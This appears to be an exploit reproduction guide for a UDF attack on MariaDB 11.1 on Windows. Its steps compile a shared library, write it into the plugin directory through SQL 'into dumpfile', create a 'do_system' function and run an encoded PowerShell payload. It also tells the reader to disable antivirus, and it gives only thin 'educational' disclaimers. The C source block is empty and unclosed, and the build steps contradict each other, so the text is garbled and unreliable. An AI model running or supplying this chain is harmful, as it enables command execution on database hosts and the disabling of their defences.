

---

# Exploit Reproduction Guide (affected product version MariaDB 11.1)

This guide provides step-by-step instructions to reproduce a User-Defined Function (UDF) attack on a database system. Please note that this exploit may work on some systems, but it might not function correctly on 64-bit architectures or certain builds.

> **Warning:** This is for educational purposes only. Unauthorized use of these techniques is illegal and unethical.

## Steps to Reproduce the Attack

### 1. Download and Prepare the UDF Code

First, create a file named `exploit.c` and add the following code:

```

### 2. Compile the UDF Code

Compile the exploit code using the `x86_64-w64-mingw32-gcc` compiler:

```bash
x86_64-w64-mingw32-gcc -g -c exploit.c
```

### 3. Create a Shared Object File

Generate a shared object file (`exploit.so`) from the compiled object file:

```bash
x86_64-w64-mingw32-gcc -g -shared -Wl,-soname,exploit.so -o exploit.so exploit.o
```

### 4. Convert the Shared Object File to Hexadecimal

Use `xxd` to convert the `.so` file to a hexadecimal format:

```bash
xxd -p exploit.so | tr -d '\n' > hex_value.txt
```

### 5. Load the Hexadecimal Value into the Database

Copy the hexadecimal value from `hex_value.txt` and execute the following command in your database:

```sql
DB> set @shell = 0x<hex_value>;
```

### 6. Determine the Plugin Directory and Deploy the Exploit

Find the plugin directory by running:

```sql
DB> select @@plugin_dir;
```

Then, create the exploit shared object in the plugin directory:

```sql
DB> select binary @shell into dumpfile 'C:\\Program Files\\MariaDB 11.1\\lib\\plugin\\exploit.so';
```

> **Note:** Adjust the path according to your system's configuration or the specific plugin directory.

### 7. Create the Malicious Function

Create a new function in the database using the exploit:

```sql
DB> create function do_system returns integer soname 'exploit.so';
```

### 8. Execute the Exploit

Disable any antivirus or Windows Defender that might block the exploit. Then, run a command using the newly created function:

```sql
DB> select do_system('powershell base64 here');
```

Replace `'powershell base64 here'` with the base64 encoded payload of the command you wish to execute.

---

**Disclaimer:** This document is intended for educational purposes and security research only. Misuse of this information can result in criminal charges and severe legal penalties. Always obtain permission from the relevant authorities before testing any vulnerabilities on a network or system.
